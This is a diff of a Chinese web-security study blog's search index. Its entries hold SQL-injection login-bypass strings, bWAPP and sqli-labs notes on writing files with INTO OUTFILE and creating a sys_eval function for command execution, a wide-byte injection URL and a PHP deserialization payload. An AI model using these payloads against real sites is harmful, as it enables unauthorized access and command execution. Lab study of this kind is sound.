-<p>万能密码<br>‘ or 1&#x3D;’1<br>‘or’&#x3D;’or’<br>admin<br>admin’–<br>admin’ or 4&#x3D;4–<br>admin’ or ‘1’&#x3D;’1’–<br>admin888<br>“or “a”&#x3D;”a<br>admin’ or 2&#x3D;2#<br>a’ having 1&#x3D;1#<br>a’ having 1&#x3D;1–<br>admin’ or ‘2’&#x3D;’2<br>‘)or(‘a’&#x3D;’a<br>or 4&#x3D;4–<br>c<br>a’or’ 4&#x3D;4–<br>“or 4&#x3D;4–<br>‘or’a’&#x3D;’a<br>“or”&#x3D;”a’&#x3D;’a<br>‘or’’&#x3D;’<br>‘or’&#x3D;’or’<br>1 or ‘1’&#x3D;’1’&#x3D;1<br>1 or ‘1’&#x3D;’1’ or 4&#x3D;4<br>‘OR 4&#x3D;4%00<br>“or 4&#x3D;4%00<br>‘xor<br>admin’ UNION Select 1,1,1 FROM admin Where ‘’&#x3D;’<br>1<br>-1%cf’ union select 1,1,1 as password,1,1,1 %23<br>1<br>17..admin’ or ‘a’&#x3D;’a 密码随便<br>‘or’&#x3D;’or’<br>‘or 4&#x3D;4&#x2F;*<br>something<br>‘ OR ‘1’&#x3D;’1<br>1’or’1’&#x3D;’1<br>admin’ OR 4&#x3D;4&#x2F;*<br>1’or’1’&#x3D;’1<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>asp aspx万能密码<br>1：”or “a”&#x3D;”a<br>2： ‘)or(‘a’&#x3D;’a<br>3：or 1&#x3D;1–<br>4：’or 1&#x3D;1–<br>5：a’or’ 1&#x3D;1–<br>6：”or 1&#x3D;1–<br>7：’or’a’&#x3D;’a<br>8：”or”&#x3D;”a’&#x3D;’a<br>9：’or”&#x3D;’<br>10：’or’&#x3D;’or’<br>11: 1 or ‘1’&#x3D;’1’&#x3D;1<br>12: 1 or ‘1’&#x3D;’1’ or 1&#x3D;1<br>13: ‘OR 1&#x3D;1%00<br>14: “or 1&#x3D;1%00<br>15: ‘xor<br>16: 用户名 ’ UNION Select 1,1,1 FROM admin Where ”&#x3D;’ （替换表名admin）<br>密码 1<br>17…admin’ or ‘a’&#x3D;’a 密码随便</p>
-<p>PHP万能密码<br>‘or 1&#x3D;1&#x2F;*<br>User: something<br>Pass: ’ OR ‘1’&#x3D;’1</p>
-<p>jsp 万能密码<br />1’or’1’&#x3D;’1<br />admin’ OR 1&#x3D;1&#x2F;*</p>
+    <url>/2023/10/23/WEB/assets/</url>
+    <content><![CDATA[<h1 id="assets"><a href="#assets" class="headerlink" title="assets"></a>assets</h1><p>‍</p>
 ]]></content>
   </entry>
   <entry>
@@ -2461,12 +2467,6 @@
 <p>​<img src="/assets/image-20231008091350-4prenme.png" alt="image">​</p>
 <p>‍</p>
 <p>‍</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2023/10/23/WEB/assets/</url>
-    <content><![CDATA[<h1 id="assets"><a href="#assets" class="headerlink" title="assets"></a>assets</h1><p>‍</p>
 ]]></content>
   </entry>
   <entry>
@@ -2527,6 +2527,20 @@
   </entry>
   <entry>
     <title></title>
+    <url>/2023/10/23/XSS/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%92%8C%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<h1 id="伪协议和编码绕过"><a href="#伪协议和编码绕过" class="headerlink" title="伪协议和编码绕过"></a>伪协议和编码绕过</h1><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>​<img src="/assets/image-20231008083228-u3fgst3.png" alt="image">​</p>
+<p>‍</p>
+<p>​<img src="/assets/image-20231008083303-mi07ngv.png" alt="image"></p>
+<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>​<img src="/assets/image-20231008083619-duc45mc.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008083713-fgy5s33.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008083847-uls40ai.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008084130-nl45nvw.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008084152-cmv9e89.png" alt="image">​</p>
+<p>‍</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
     <url>/2023/10/23/XSS/%E6%B7%B7%E6%B7%86%E7%BC%96%E7%A0%81/</url>
     <content><![CDATA[<h1 id="混淆编码"><a href="#混淆编码" class="headerlink" title="混淆编码"></a>混淆编码</h1><h2 id="1-混合编码"><a href="#1-混合编码" class="headerlink" title="1.混合编码"></a>1.混合编码</h2><p>​<img src="/assets/image-20231008091848-uz85y9c.png" alt="image">​</p>
 <p>​<img src="/assets/image-20231008091931-1ii28ht.png" alt="image">​</p>
@@ -2560,20 +2574,6 @@
 <p>​<img src="/assets/image-20231020194951-jb70ln2.png" alt="image">​</p>
 <p>​<img src="/assets/image-20231020195017-geotvoy.png" alt="image">​</p>
 <p>​<img src="/assets/image-20231020195704-nltcvjy.png" alt="image">​</p>
-<p>‍</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2023/10/23/XSS/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%92%8C%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<h1 id="伪协议和编码绕过"><a href="#伪协议和编码绕过" class="headerlink" title="伪协议和编码绕过"></a>伪协议和编码绕过</h1><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>​<img src="/assets/image-20231008083228-u3fgst3.png" alt="image">​</p>
-<p>‍</p>
-<p>​<img src="/assets/image-20231008083303-mi07ngv.png" alt="image"></p>
-<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>​<img src="/assets/image-20231008083619-duc45mc.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008083713-fgy5s33.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008083847-uls40ai.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008084130-nl45nvw.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008084152-cmv9e89.png" alt="image">​</p>
 <p>‍</p>
 ]]></content>
   </entry>
@@ -2620,57 +2620,6 @@
 <p>在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup()，去执行__destruct</p>
 <p>于是我们这样构造pyload:</p>
 <p>?select&#x3D;O:4:&quot;Name&quot;:3:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}</p>
-<p>‍</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2023/10/23/WEB/PHP%E5%AE%89%E5%85%A8/assets/</url>
-    <content><![CDATA[<h1 id="assets"><a href="#assets" class="headerlink" title="assets"></a>assets</h1><p>‍</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2023/10/23/WEB/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
-    <content><![CDATA[<h1 id="SQL注入之命令执行"><a href="#SQL注入之命令执行" class="headerlink" title="SQL注入之命令执行"></a>SQL注入之命令执行</h1><p>​<img src="/assets/image-20230929220301-q2rkffq.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929221850-zp3nc5q.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929221930-t4ta1ll.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929222222-2e6kdc4.png" alt="image">​</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span>;</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br><span class="line">+----+-------+----------+--------+</span><br><span class="line">| <span class="built_in">id</span> | login | password | secret |</span><br><span class="line">+----+-------+----------+--------+</span><br><span class="line">|  <span class="number">1</span> | <span class="number">2</span>     | <span class="number">3</span>        | <span class="number">4</span>      |</span><br><span class="line">+----+-------+----------+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;hello&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/&#x27;</span>;</span><br><span class="line">ERROR <span class="number">1086</span> (HY000): File <span class="string">&#x27;/var/www/html/&#x27;</span> already exists</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;hello&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/abc.txt&#x27;</span>;</span><br><span class="line">ERROR <span class="number">1</span> (HY000): Can<span class="string">&#x27;t create/write to file &#x27;</span>/var/www/html/abc.txt<span class="string">&#x27; (Errcode: 13)</span></span><br><span class="line"><span class="string">mysql&gt; </span></span><br></pre></td></tr></table></figure>
-
-<p>找到有写权限的文件夹。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mysql&gt; use bWAPP;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table <span class="keyword">and</span> column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;hello&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/images/abc.php&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">1</span> row affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>‍</p>
-<p>​<img src="/assets/image-20230929223031-0y9r1kb.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929223018-4ltxznq.png" alt="image"></p>
-<p>​​<img src="/assets/image-20230929223317-hoszwjl.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004200527-5oew64i.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004200543-b53cym0.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004200739-k7afew9.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004201846-woehgms.png" alt="image"></p>
-<p>剔除回车</p>
-<p>tr -d ‘\n’ &lt; input.txt &gt; output.txt​</p>
-<p>​<img src="/assets/image-20231004202619-mwbcoga.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004202813-jqg4kd8.png" alt="image">​</p>
-<p>成功写入。</p>
-<p>创建自定义函数。</p>
-<p>​<img src="/assets/image-20231004202940-0u8nkmq.png" alt="image">​</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string soname <span class="string">&quot;lib_linux1.so&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>​<img src="/assets/image-20231004204816-7dyad18.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004204847-iqrgc5l.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004204911-vr8djbp.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004204944-o1zialm.png" alt="image"></p>
-<p>​</p>
-<h2 id="用户和组的概念"><a href="#用户和组的概念" class="headerlink" title="用户和组的概念"></a>用户和组的概念</h2><p>​<img src="/assets/image-20231004230229-9qfa4m0.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004230309-b61lag4.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004230400-u38bj2h.png" alt="image"></p>
-<p>​​<img src="/assets/image-20231004230437-96at58h.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004230522-04vylgc.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004230558-4ttxdtt.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004230612-hai1k6e.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231004230646-vmtl41l.png" alt="image">​</p>
 <p>‍</p>
 ]]></content>
   </entry>
@@ -2741,56 +2690,8 @@
   </entry>
   <entry>
     <title></title>
-    <url>/2023/10/23/WEB/SQL%E6%B3%A8%E5%85%A5/%E6%B7%B7%E6%B7%86%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="混淆注入"><a href="#混淆注入" class="headerlink" title="混淆注入"></a>混淆注入</h1><h2 id="1-定义和原理"><a href="#1-定义和原理" class="headerlink" title="1.定义和原理"></a>1.定义和原理</h2><p>​<img src="/assets/image-20230928163137-st1icap.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230928163225-cfhi8nn.png" alt="image">​</p>
-<h2 id="2-大小写绕过"><a href="#2-大小写绕过" class="headerlink" title="2.大小写绕过"></a>2.大小写绕过</h2><p>​<img src="/assets/image-20230928165435-0x254vi.png" alt="image">​</p>
-<p>过滤掉了union。</p>
-<p>大小写绕过。</p>
-<p>​<img src="/assets/image-20230928165950-dje05y4.png" alt="image">​</p>
-<h2 id="3-和-和union和where和limit绕过"><a href="#3-和-和union和where和limit绕过" class="headerlink" title="3.||和&amp;&amp;和union和where和limit绕过"></a>3.||和&amp;&amp;和union和where和limit绕过</h2><p>​<img src="/assets/image-20230928170426-3xmz4sg.png" alt="image">​</p>
-<p>前后的&#x2F;表示开头和结尾，第二个&#x2F;后面的i表示对大小写不敏感。</p>
-<p>​<img src="/assets/image-20230928170740-tzwj107.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929165746-l8lo9h8.png" alt="image"></p>
-<p>​<img src="/assets/image-20230929170453-7r1zvj9.png" alt="image">​​</p>
-<p>​<img src="/assets/image-20230929165822-z0wicgg.png" alt="image"></p>
-<p>可用limit 1,1进行绕过。</p>
-<p>​<img src="/assets/image-20230929170751-0fe5the.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929171015-55d3miy.png" alt="image">​</p>
-<h2 id="4-绕过groupby-select-单引号-hex-unhex-substr"><a href="#4-绕过groupby-select-单引号-hex-unhex-substr" class="headerlink" title="4.绕过groupby,select,单引号,hex,unhex,substr"></a>4.绕过groupby,select,单引号,hex,unhex,substr</h2><p>​<img src="/assets/image-20230929171517-aclz6x9.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929171802-u8npuk2.png" alt="image"></p>
-<p>​​<img src="/assets/image-20230929172113-zprcrg9.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929171912-sykrv5o.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929172238-pjrnsuv.png" alt="image">​</p>
-<p>​​<img src="/assets/image-20230929192504-8pmu3gf.png" alt="image">​</p>
-<p>​​<img src="/assets/image-20230929193335-s693d2l.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929193419-5q1ec6f.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929193542-g65par1.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929194323-xip1yr0.png" alt="image">​</p>
-<h2 id="5-绕过空格，等号，双写，双重编码"><a href="#5-绕过空格，等号，双写，双重编码" class="headerlink" title="5.绕过空格，等号，双写，双重编码"></a>5.绕过空格，等号，双写，双重编码</h2><p>​<img src="/assets/image-20230929194421-2iix6py.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929194642-gtv0y5y.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929194810-rfw6gk3.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929194926-gatkys5.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929194951-ttjiisr.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929195042-gt2ne0q.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929195117-0bwtu75.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929195335-d84jfdc.png" alt="image">​</p>
-<h2 id="6-宽字节注入"><a href="#6-宽字节注入" class="headerlink" title="6.宽字节注入"></a>6.宽字节注入</h2><p>​<img src="/assets/image-20230929200502-evtim0e.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929201445-jjmwund.png" alt="image">​</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8011</span>/sqli-labs-master/Less-<span class="number">36</span>/?<span class="built_in">id</span>=<span class="number">1123</span> %df%<span class="number">27</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
-
-<p>​<img src="/assets/image-20230929201623-98dgjv2.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929201651-x91351z.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929201731-5xwmf0c.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929201807-5fd8095.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929201858-31o99zi.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929204034-fabvv0e.png" alt="image">​</p>
-<h2 id="7-二次注入"><a href="#7-二次注入" class="headerlink" title="7.二次注入"></a>7.二次注入</h2><p>​<img src="/assets/image-20230929210937-3uwi6xc.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929215939-5jupz81.png" alt="image">​</p>
-<p>构造恶意用户名，当登录上刚刚注册的账户后，可以修改自己的密码，但是由于’#的闭合以及注释作用，直接可以修改admin的密码。</p>
-<p>​<img src="/assets/image-20230929215812-edri7nl.png" alt="image">​</p>
-<p>​<img src="/assets/image-20230929215752-rpzexyo.png" alt="image">​</p>
-<p>‍</p>
+    <url>/2023/10/23/WEB/PHP%E5%AE%89%E5%85%A8/assets/</url>
+    <content><![CDATA[<h1 id="assets"><a href="#assets" class="headerlink" title="assets"></a>assets</h1><p>‍</p>
 ]]></content>
   </entry>
   <entry>
@@ -2914,6 +2815,105 @@
 <p>得到flag。</p>
 <p>经验：</p>
 <p>多次尝试不同方式的字符绕过，以及连接符（比如：|或;或者&amp;&amp;）。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/10/23/WEB/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h1 id="SQL注入之命令执行"><a href="#SQL注入之命令执行" class="headerlink" title="SQL注入之命令执行"></a>SQL注入之命令执行</h1><p>​<img src="/assets/image-20230929220301-q2rkffq.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929221850-zp3nc5q.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929221930-t4ta1ll.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929222222-2e6kdc4.png" alt="image">​</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span>;</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br><span class="line">+----+-------+----------+--------+</span><br><span class="line">| <span class="built_in">id</span> | login | password | secret |</span><br><span class="line">+----+-------+----------+--------+</span><br><span class="line">|  <span class="number">1</span> | <span class="number">2</span>     | <span class="number">3</span>        | <span class="number">4</span>      |</span><br><span class="line">+----+-------+----------+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;hello&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/&#x27;</span>;</span><br><span class="line">ERROR <span class="number">1086</span> (HY000): File <span class="string">&#x27;/var/www/html/&#x27;</span> already exists</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;hello&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/abc.txt&#x27;</span>;</span><br><span class="line">ERROR <span class="number">1</span> (HY000): Can<span class="string">&#x27;t create/write to file &#x27;</span>/var/www/html/abc.txt<span class="string">&#x27; (Errcode: 13)</span></span><br><span class="line"><span class="string">mysql&gt; </span></span><br></pre></td></tr></table></figure>
+
+<p>找到有写权限的文件夹。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mysql&gt; use bWAPP;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table <span class="keyword">and</span> column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;hello&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/images/abc.php&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">1</span> row affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>​<img src="/assets/image-20230929223031-0y9r1kb.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929223018-4ltxznq.png" alt="image"></p>
+<p>​​<img src="/assets/image-20230929223317-hoszwjl.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004200527-5oew64i.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004200543-b53cym0.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004200739-k7afew9.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004201846-woehgms.png" alt="image"></p>
+<p>剔除回车</p>
+<p>tr -d ‘\n’ &lt; input.txt &gt; output.txt​</p>
+<p>​<img src="/assets/image-20231004202619-mwbcoga.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004202813-jqg4kd8.png" alt="image">​</p>
+<p>成功写入。</p>
+<p>创建自定义函数。</p>
+<p>​<img src="/assets/image-20231004202940-0u8nkmq.png" alt="image">​</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string soname <span class="string">&quot;lib_linux1.so&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20231004204816-7dyad18.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004204847-iqrgc5l.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004204911-vr8djbp.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004204944-o1zialm.png" alt="image"></p>
+<p>​</p>
+<h2 id="用户和组的概念"><a href="#用户和组的概念" class="headerlink" title="用户和组的概念"></a>用户和组的概念</h2><p>​<img src="/assets/image-20231004230229-9qfa4m0.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004230309-b61lag4.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004230400-u38bj2h.png" alt="image"></p>
+<p>​​<img src="/assets/image-20231004230437-96at58h.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004230522-04vylgc.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004230558-4ttxdtt.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004230612-hai1k6e.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004230646-vmtl41l.png" alt="image">​</p>
+<p>‍</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/10/23/WEB/SQL%E6%B3%A8%E5%85%A5/%E6%B7%B7%E6%B7%86%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="混淆注入"><a href="#混淆注入" class="headerlink" title="混淆注入"></a>混淆注入</h1><h2 id="1-定义和原理"><a href="#1-定义和原理" class="headerlink" title="1.定义和原理"></a>1.定义和原理</h2><p>​<img src="/assets/image-20230928163137-st1icap.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230928163225-cfhi8nn.png" alt="image">​</p>
+<h2 id="2-大小写绕过"><a href="#2-大小写绕过" class="headerlink" title="2.大小写绕过"></a>2.大小写绕过</h2><p>​<img src="/assets/image-20230928165435-0x254vi.png" alt="image">​</p>
+<p>过滤掉了union。</p>
+<p>大小写绕过。</p>
+<p>​<img src="/assets/image-20230928165950-dje05y4.png" alt="image">​</p>
+<h2 id="3-和-和union和where和limit绕过"><a href="#3-和-和union和where和limit绕过" class="headerlink" title="3.||和&amp;&amp;和union和where和limit绕过"></a>3.||和&amp;&amp;和union和where和limit绕过</h2><p>​<img src="/assets/image-20230928170426-3xmz4sg.png" alt="image">​</p>
+<p>前后的&#x2F;表示开头和结尾，第二个&#x2F;后面的i表示对大小写不敏感。</p>
+<p>​<img src="/assets/image-20230928170740-tzwj107.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929165746-l8lo9h8.png" alt="image"></p>
+<p>​<img src="/assets/image-20230929170453-7r1zvj9.png" alt="image">​​</p>
+<p>​<img src="/assets/image-20230929165822-z0wicgg.png" alt="image"></p>
+<p>可用limit 1,1进行绕过。</p>
+<p>​<img src="/assets/image-20230929170751-0fe5the.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929171015-55d3miy.png" alt="image">​</p>
+<h2 id="4-绕过groupby-select-单引号-hex-unhex-substr"><a href="#4-绕过groupby-select-单引号-hex-unhex-substr" class="headerlink" title="4.绕过groupby,select,单引号,hex,unhex,substr"></a>4.绕过groupby,select,单引号,hex,unhex,substr</h2><p>​<img src="/assets/image-20230929171517-aclz6x9.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929171802-u8npuk2.png" alt="image"></p>
+<p>​​<img src="/assets/image-20230929172113-zprcrg9.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929171912-sykrv5o.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929172238-pjrnsuv.png" alt="image">​</p>
+<p>​​<img src="/assets/image-20230929192504-8pmu3gf.png" alt="image">​</p>
+<p>​​<img src="/assets/image-20230929193335-s693d2l.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929193419-5q1ec6f.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929193542-g65par1.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929194323-xip1yr0.png" alt="image">​</p>
+<h2 id="5-绕过空格，等号，双写，双重编码"><a href="#5-绕过空格，等号，双写，双重编码" class="headerlink" title="5.绕过空格，等号，双写，双重编码"></a>5.绕过空格，等号，双写，双重编码</h2><p>​<img src="/assets/image-20230929194421-2iix6py.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929194642-gtv0y5y.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929194810-rfw6gk3.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929194926-gatkys5.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929194951-ttjiisr.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929195042-gt2ne0q.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929195117-0bwtu75.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929195335-d84jfdc.png" alt="image">​</p>
+<h2 id="6-宽字节注入"><a href="#6-宽字节注入" class="headerlink" title="6.宽字节注入"></a>6.宽字节注入</h2><p>​<img src="/assets/image-20230929200502-evtim0e.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929201445-jjmwund.png" alt="image">​</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8011</span>/sqli-labs-master/Less-<span class="number">36</span>/?<span class="built_in">id</span>=<span class="number">1123</span> %df%<span class="number">27</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20230929201623-98dgjv2.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929201651-x91351z.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929201731-5xwmf0c.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929201807-5fd8095.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929201858-31o99zi.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929204034-fabvv0e.png" alt="image">​</p>
+<h2 id="7-二次注入"><a href="#7-二次注入" class="headerlink" title="7.二次注入"></a>7.二次注入</h2><p>​<img src="/assets/image-20230929210937-3uwi6xc.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929215939-5jupz81.png" alt="image">​</p>
+<p>构造恶意用户名，当登录上刚刚注册的账户后，可以修改自己的密码，但是由于’#的闭合以及注释作用，直接可以修改admin的密码。</p>
+<p>​<img src="/assets/image-20230929215812-edri7nl.png" alt="image">​</p>
